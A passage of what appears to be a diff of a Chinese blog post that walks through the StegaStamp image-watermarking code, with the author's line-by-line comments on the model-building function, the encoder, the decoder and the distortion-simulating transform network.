class="comment">#一系列没看懂的变形操作，得到一个变形后的输入图像</span></span><br><span class="line">    residual_warped = encoder((secret_input, input_warped))</span><br><span class="line">    <span class="comment">#将变形后的输入图像和secret_input一起输入到编码器模型中，进行编码，得到一个residual图像，里面蕴含着水印信息</span></span><br><span class="line">    encoded_warped = residual_warped + input_warped</span><br><span class="line">    <span class="comment">#将含有水印信息的residual图像加回到变形后的输入图像，得到一个变形的含水印图像</span></span><br><span class="line">    residual = tf.contrib.image.transform(residual_warped, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">    <span class="comment">#再通过形变矩阵的逆，将变形的含水印图像变回去</span></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> loss_op, secret_loss_op, D_loss_op, summary_op, image_summary_op, _ = models.build_model(</span><br><span class="line">     encoder=encoder,</span><br><span class="line">     decoder=decoder,</span><br><span class="line">	 discriminator=discriminator,</span><br><span class="line">	 secret_input=secret_pl,</span><br><span class="line">     image_input=image_pl,</span><br><span class="line">     l2_edge_gain=l2_edge_gain_pl,</span><br><span class="line">     borders=args.borders,</span><br><span class="line">     secret_size=args.secret_size,</span><br><span class="line">     M=M_pl,</span><br><span class="line">	 loss_scales=loss_scales_pl,</span><br><span class="line">     yuv_scales=yuv_scales_pl,</span><br><span class="line">     args=args,</span><br><span class="line">	 global_step=global_step_tensor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立模型在models.py中从184行开始</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_model</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">    	...</span></span></span><br><span class="line"><span class="params"><span class="function">               </span>):</span></span><br><span class="line">    input_warped = tf.contrib.image.transform(image_input, M[:,<span class="number">1</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">    <span class="comment">#根据M[:,1,:]矩阵进行投影变形</span></span><br><span class="line">    <span class="comment">#train.py:178	M = utils.get_rand_transform_matrix(width, np.floor(width * rnd_tran), args.batch_size)</span></span><br><span class="line">    <span class="comment">#获取一个随机的形变矩阵（具体算法可以看utils.py）</span></span><br><span class="line">    mask_warped = tf.contrib.image.transform(tf.ones_like(input_warped), M[:,<span class="number">1</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">    input_warped += (<span class="number">1</span>-mask_warped) * image_input</span><br><span class="line">    <span class="comment">#一系列没看懂的变形操作，得到一个变形后的输入图像</span></span><br><span class="line">    residual_warped = encoder((secret_input, input_warped))</span><br><span class="line">    <span class="comment">#将变形后的输入图像和secret_input一起输入到编码器模型中，进行编码，得到一个变形后的residual图像，里面蕴含着水印信息</span></span><br><span class="line">    encoded_warped = residual_warped + input_warped</span><br><span class="line">    <span class="comment">#将含有水印信息的residual图像加回到变形后的输入图像，得到一个变形的含水印图像</span></span><br><span class="line">    residual = tf.contrib.image.transform(residual_warped, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">    <span class="comment">#再通过形变矩阵的逆，将变形的residual变回去</span></span><br><span class="line">    <span class="comment">#？？为什么要给编码器输入image_warped而不是直接输入image_input的？？</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#下面是在各种边框下，对编码图像的处理</span></span><br><span class="line">    <span class="keyword">if</span> borders == <span class="string">&#x27;no_edge&#x27;</span>:	<span class="comment">#无边框</span></span><br><span class="line">        encoded_image = image_input + residual</span><br><span class="line">    <span class="keyword">elif</span> borders == <span class="string">&#x27;black&#x27;</span>:	<span class="comment">#黑色边框</span></span><br><span class="line">        encoded_image = residual_warped + input_warped</span><br><span class="line">        encoded_image = tf.contrib.image.transform(encoded_image, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        input_unwarped = tf.contrib.image.transform(input_warped, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> borders.startswith(<span class="string">&#x27;random&#x27;</span>):	<span class="comment">#？？？随机？？？</span></span><br><span class="line">        mask = tf.contrib.image.transform(tf.ones_like(residual), M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        encoded_image = residual_warped + input_warped</span><br><span class="line">        encoded_image = tf.contrib.image.transform(encoded_image, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        input_unwarped = tf.contrib.image.transform(input_warped, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        ch = <span class="number">3</span> <span class="keyword">if</span> borders.endswith(<span class="string">&#x27;rgb&#x27;</span>) <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        encoded_image += (<span class="number">1</span>-mask) * tf.ones_like(residual) * tf.random.uniform([ch])</span><br><span class="line">    <span class="keyword">elif</span> borders == <span class="string">&#x27;white&#x27;</span>:	<span class="comment">#白色边框</span></span><br><span class="line">        mask = tf.contrib.image.transform(tf.ones_like(residual), M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        encoded_image = residual_warped + input_warped</span><br><span class="line">        encoded_image = tf.contrib.image.transform(encoded_image, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        input_unwarped = tf.contrib.image.transform(input_warped, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        encoded_image += (<span class="number">1</span>-mask) * tf.ones_like(residual)</span><br><span class="line">    <span class="keyword">elif</span> borders == <span class="string">&#x27;image&#x27;</span>:	<span class="comment">#？？图片边框？？</span></span><br><span class="line">        mask = tf.contrib.image.transform(tf.ones_like(residual), M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        encoded_image = residual_warped + input_warped</span><br><span class="line">        encoded_image = tf.contrib.image.transform(encoded_image, M[:,<span class="number">0</span>,:], interpolation=<span class="string">&#x27;BILINEAR&#x27;</span>)</span><br><span class="line">        encoded_image += (<span class="number">1</span>-mask) * tf.manip.roll(image_input, shift=<span class="number">1</span>, axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    transformed_image, transform_summaries = transform_net(encoded_image, args, global_step)</span><br><span class="line">    <span class="comment">#让编码图像进入变换网络（透视变形，运动/散焦模糊，颜色处理（打印机和显示器的色域有限），噪声），得到一个噪声图像</span></span><br><span class="line">    decoded_secret = decoder(transformed_image)</span><br><span class="line">    <span class="comment">#让噪声图像进入编码器，得到解码信息</span></span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">#后面是计算各种loss函数，不细说，两行比较重要的代码</span></span><br><span class="line">    <span class="comment">#1、计算信息恢复的准确率，函数具体在utils.py</span></span><br><span class="line">    bit_acc, str_acc = get_secret_acc(secret_input, decoded_secret)</span><br><span class="line">    <span class="comment">#2、计算总loss函数</span></span><br><span class="line">    loss_op = loss_scales[<span class="number">0</span>]*image_loss_op + loss_scales[<span class="number">1</span>]*lpips_loss_op + loss_scales[<span class="number">2</span>]*secret_loss_op</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> loss_op, secret_loss_op, D_loss, summary_op, image_summary_op, bit_acc</span><br></pre></td></tr></table></figure>
 
-<h2 id="编码器模型"><a href="#编码器模型" class="headerlink" title="编码器模型"></a>编码器模型</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StegaStampEncoder</span>(<span class="params">Layer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, height, width</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(StegaStampEncoder, self).__init__()</span><br><span class="line">        self.secret_dense = Dense(<span class="number">7500</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        <span class="comment">#将输入的100bit图像扩展成7500bit大小</span></span><br><span class="line">        self.conv1 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv2 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv3 = Conv2D(<span class="number">64</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv4 = Conv2D(<span class="number">128</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv5 = Conv2D(<span class="number">256</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up6 = Conv2D(<span class="number">128</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv6 = Conv2D(<span class="number">128</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up7 = Conv2D(<span class="number">64</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv7 = Conv2D(<span class="number">64</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up8 = Conv2D(<span class="number">32</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv8 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up9 = Conv2D(<span class="number">32</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv9 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv10 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.residual = Conv2D(<span class="number">3</span>, <span class="number">1</span>, activation=<span class="literal">None</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        secret, image = inputs</span><br><span class="line">        secret = secret - <span class="number">.5</span></span><br><span class="line">        image = image - <span class="number">.5</span></span><br><span class="line">        <span class="comment">#对输入的水印信息和图像矩阵进行处理（看不懂这个- .5）</span></span><br><span class="line">        secret = self.secret_dense(secret)</span><br><span class="line">        <span class="comment">#见上方的 self.secret_dense ，将输入的100bit图像扩展成7500bit大小</span></span><br><span class="line">        secret = Reshape((<span class="number">50</span>, <span class="number">50</span>, <span class="number">3</span>))(secret)</span><br><span class="line">        <span class="comment">#将一维水印信息变为3维，7500 = 50 * 50 * 3</span></span><br><span class="line">        secret_enlarged = UpSampling2D(size=(<span class="number">8</span>,<span class="number">8</span>))(secret)</span><br><span class="line">		<span class="comment">#(50,50,3)进行上采样变为(400,400,3)</span></span><br><span class="line">        inputs = concatenate([secret_enlarged, image], axis=-<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#将secret和image拼接到一起，concatenate()函数没太明白拼接过程，axis = -1太抽象了</span></span><br><span class="line">        conv1 = self.conv1(inputs)</span><br><span class="line">        conv2 = self.conv2(conv1)</span><br><span class="line">        conv3 = self.conv3(conv2)</span><br><span class="line">        conv4 = self.conv4(conv3)</span><br><span class="line">        conv5 = self.conv5(conv4)</span><br><span class="line">        up6 = self.up6(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv5))</span><br><span class="line">        merge6 = concatenate([conv4,up6], axis=<span class="number">3</span>)</span><br><span class="line">        conv6 = self.conv6(merge6)</span><br><span class="line">        up7 = self.up7(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv6))</span><br><span class="line">        merge7 = concatenate([conv3,up7], axis=<span class="number">3</span>)</span><br><span class="line">        conv7 = self.conv7(merge7)</span><br><span class="line">        up8 = self.up8(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv7))</span><br><span class="line">        merge8 = concatenate([conv2,up8], axis=<span class="number">3</span>)</span><br><span class="line">        conv8 = self.conv8(merge8)</span><br><span class="line">        up9 = self.up9(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv8))</span><br><span class="line">        merge9 = concatenate([conv1,up9,inputs], axis=<span class="number">3</span>)</span><br><span class="line">        conv9 = self.conv9(merge9)</span><br><span class="line">        conva = self.conv9(merge9)</span><br><span class="line">        conv10 = self.conv10(conv9)</span><br><span class="line">        residual = self.residual(conv9)</span><br><span class="line">        <span class="keyword">return</span> residual</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="编码器模型"><a href="#编码器模型" class="headerlink" title="编码器模型"></a>编码器模型</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StegaStampEncoder</span>(<span class="params">Layer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, height, width</span>):</span></span><br><span class="line">        <span class="comment">#初始化的时候传入图片长和宽</span></span><br><span class="line">        <span class="built_in">super</span>(StegaStampEncoder, self).__init__()</span><br><span class="line">        self.secret_dense = Dense(<span class="number">7500</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        <span class="comment">#将输入的100bit图像扩展成7500bit大小</span></span><br><span class="line">        self.conv1 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv2 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv3 = Conv2D(<span class="number">64</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv4 = Conv2D(<span class="number">128</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv5 = Conv2D(<span class="number">256</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, strides=<span class="number">2</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up6 = Conv2D(<span class="number">128</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv6 = Conv2D(<span class="number">128</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up7 = Conv2D(<span class="number">64</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv7 = Conv2D(<span class="number">64</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up8 = Conv2D(<span class="number">32</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv8 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.up9 = Conv2D(<span class="number">32</span>, <span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv9 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.conv10 = Conv2D(<span class="number">32</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line">        self.residual = Conv2D(<span class="number">3</span>, <span class="number">1</span>, activation=<span class="literal">None</span>, padding=<span class="string">&#x27;same&#x27;</span>, kernel_initializer=<span class="string">&#x27;he_normal&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        secret, image = inputs</span><br><span class="line">        secret = secret - <span class="number">.5</span></span><br><span class="line">        image = image - <span class="number">.5</span></span><br><span class="line">        <span class="comment">#对输入的水印信息和图像矩阵进行处理（看不懂这个- .5）</span></span><br><span class="line">        secret = self.secret_dense(secret)</span><br><span class="line">        <span class="comment">#见上方的 self.secret_dense ，将输入的100bit图像扩展成7500bit大小</span></span><br><span class="line">        secret = Reshape((<span class="number">50</span>, <span class="number">50</span>, <span class="number">3</span>))(secret)</span><br><span class="line">        <span class="comment">#将一维水印信息变为3维，7500 = 50 * 50 * 3</span></span><br><span class="line">        secret_enlarged = UpSampling2D(size=(<span class="number">8</span>,<span class="number">8</span>))(secret)</span><br><span class="line">		<span class="comment">#(50,50,3)进行上采样变为(400,400,3)</span></span><br><span class="line">        inputs = concatenate([secret_enlarged, image], axis=-<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#将secret和image拼接到一起，concatenate()函数没太明白拼接过程，axis = -1太抽象了</span></span><br><span class="line">        conv1 = self.conv1(inputs)</span><br><span class="line">        conv2 = self.conv2(conv1)</span><br><span class="line">        conv3 = self.conv3(conv2)</span><br><span class="line">        conv4 = self.conv4(conv3)</span><br><span class="line">        conv5 = self.conv5(conv4)</span><br><span class="line">        up6 = self.up6(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv5))</span><br><span class="line">        merge6 = concatenate([conv4,up6], axis=<span class="number">3</span>)</span><br><span class="line">        conv6 = self.conv6(merge6)</span><br><span class="line">        up7 = self.up7(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv6))</span><br><span class="line">        merge7 = concatenate([conv3,up7], axis=<span class="number">3</span>)</span><br><span class="line">        conv7 = self.conv7(merge7)</span><br><span class="line">        up8 = self.up8(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv7))</span><br><span class="line">        merge8 = concatenate([conv2,up8], axis=<span class="number">3</span>)</span><br><span class="line">        conv8 = self.conv8(merge8)</span><br><span class="line">        up9 = self.up9(UpSampling2D(size=(<span class="number">2</span>,<span class="number">2</span>))(conv8))</span><br><span class="line">        merge9 = concatenate([conv1,up9,inputs], axis=<span class="number">3</span>)</span><br><span class="line">        conv9 = self.conv9(merge9)</span><br><span class="line">        conva = self.conv9(merge9)</span><br><span class="line">        conv10 = self.conv10(conv9)</span><br><span class="line">        residual = self.residual(conv9)</span><br><span class="line">        <span class="keyword">return</span> residual</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="解码器模型"><a href="#解码器模型" class="headerlink" title="解码器模型"></a>解码器模型</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StegaStampDecoder</span>(<span class="params">Layer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, secret_size, height, width</span>):</span></span><br><span class="line">        <span class="comment">#初始化传入图片长和宽，还有水印信息长度</span></span><br><span class="line">        <span class="built_in">super</span>(StegaStampDecoder, self).__init__()</span><br><span class="line">        self.height = height</span><br><span class="line">        self.width = width</span><br><span class="line">        <span class="comment">#空间变换网络，由于透视形变，需要对得到的图像进行空间变换。</span></span><br><span class="line">        self.stn_params = Sequential([</span><br><span class="line">            Conv2D(<span class="number">32</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">128</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Flatten(),</span><br><span class="line">            Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>)</span><br><span class="line">        ])</span><br><span class="line">        <span class="comment">#下面一段看不懂了</span></span><br><span class="line">        initial = np.array([[<span class="number">1.</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1.</span>, <span class="number">0</span>]])</span><br><span class="line">        initial = initial.astype(<span class="string">&#x27;float32&#x27;</span>).flatten()</span><br><span class="line">        </span><br><span class="line">        self.W_fc1 = tf.Variable(tf.zeros([<span class="number">128</span>, <span class="number">6</span>]), name=<span class="string">&#x27;W_fc1&#x27;</span>)</span><br><span class="line">        self.b_fc1 = tf.Variable(initial_value=initial, name=<span class="string">&#x27;b_fc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.decoder = Sequential([</span><br><span class="line">            Conv2D(<span class="number">32</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">32</span>, (<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">128</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Conv2D(<span class="number">128</span>, (<span class="number">3</span>, <span class="number">3</span>), strides=<span class="number">2</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>),</span><br><span class="line">            Flatten(),</span><br><span class="line">            Dense(<span class="number">512</span>, activation=<span class="string">&#x27;relu&#x27;</span>),</span><br><span class="line">            Dense(secret_size)</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        image = image - <span class="number">.5</span></span><br><span class="line">        <span class="comment">#对输入的解码图像进行预处理，主要是空间变换</span></span><br><span class="line">        stn_params = self.stn_params(image)</span><br><span class="line">        x = tf.matmul(stn_params, self.W_fc1) + self.b_fc1</span><br><span class="line">        transformed_image = stn_transformer(image, x, [self.height, self.width, <span class="number">3</span>])</span><br><span class="line">        <span class="comment">#纠正透视形变后，输入给解码器，返回恢复的水印信息</span></span><br><span class="line">        <span class="keyword">return</span> self.decoder(transformed_image)</span><br></pre></td></tr></table></figure>
+
+<h1 id="模拟真实环境变换网络"><a href="#模拟真实环境变换网络" class="headerlink" title="模拟真实环境变换网络"></a>模拟真实环境变换网络</h1><p>这一部分看的太困难了，大致就是对编码图像进行各种处理（透视变形，运动/散焦模糊，颜色处理（打印机和显示器的色域有限），噪声）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform_net</span>(<span class="params">encoded_image, args, global_step</span>):</span>	<span class="comment">#传入的参数args中有对该网络的设置，设置了噪声强度</span></span><br><span class="line">    sh = tf.shape(encoded_image)</span><br><span class="line"></span><br><span class="line">    ramp_fn = <span class="keyword">lambda</span> ramp : tf.minimum(tf.to_float(global_step) / ramp, <span class="number">1.</span>)</span><br><span class="line">	<span class="comment">#随机产生亮度变化、色调变化</span></span><br><span class="line">    rnd_bri = ramp_fn(args.rnd_bri_ramp) * args.rnd_bri</span><br><span class="line">    rnd_hue = ramp_fn(args.rnd_hue_ramp) * args.rnd_hue</span><br><span class="line">    rnd_brightness = utils.get_rnd_brightness_tf(rnd_bri, rnd_hue, args.batch_size)</span><br><span class="line">	<span class="comment">#jpeg压缩</span></span><br><span class="line">    jpeg_quality = <span class="number">100.</span> - tf.random.uniform([]) * ramp_fn(args.jpeg_quality_ramp) * (<span class="number">100.</span>-args.jpeg_quality)</span><br><span class="line">    jpeg_factor = tf.cond(tf.less(jpeg_quality, <span class="number">50</span>), <span class="keyword">lambda</span>: <span class="number">5000.</span> / jpeg_quality, <span class="keyword">lambda</span>: <span class="number">200.</span> - jpeg_quality * <span class="number">2</span>) / <span class="number">100.</span> + <span class="number">.0001</span></span><br><span class="line">	<span class="comment">#产生随机噪声</span></span><br><span class="line">    rnd_noise = tf.random.uniform([]) * ramp_fn(args.rnd_noise_ramp) * args.rnd_noise</span><br><span class="line">	<span class="comment">#对比度变化</span></span><br><span class="line">    contrast_low = <span class="number">1.</span> - (<span class="number">1.</span> - args.contrast_low) * ramp_fn(args.contrast_ramp)</span><br><span class="line">    contrast_high = <span class="number">1.</span> + (args.contrast_high - <span class="number">1.</span>) * ramp_fn(args.contrast_ramp)</span><br><span class="line">    contrast_params = [contrast_low, contrast_high]</span><br><span class="line">	<span class="comment">#饱和度变化</span></span><br><span class="line">    rnd_sat = tf.random.uniform([]) * ramp_fn(args.rnd_sat_ramp) * args.rnd_sat</span><br><span class="line"></span><br><span class="line">    <span class="comment">#运动/散焦模糊</span></span><br><span class="line">    f = utils.random_blur_kernel(probs=[<span class="number">.25</span>,<span class="number">.25</span>], N_blur=<span class="number">7</span>,</span><br><span class="line">                           sigrange_gauss=[<span class="number">1.</span>,<span class="number">3.</span>], sigrange_line=[<span class="number">.25</span>,<span class="number">1.</span>], wmin_line=<span class="number">3</span>)</span><br><span class="line">    encoded_image = 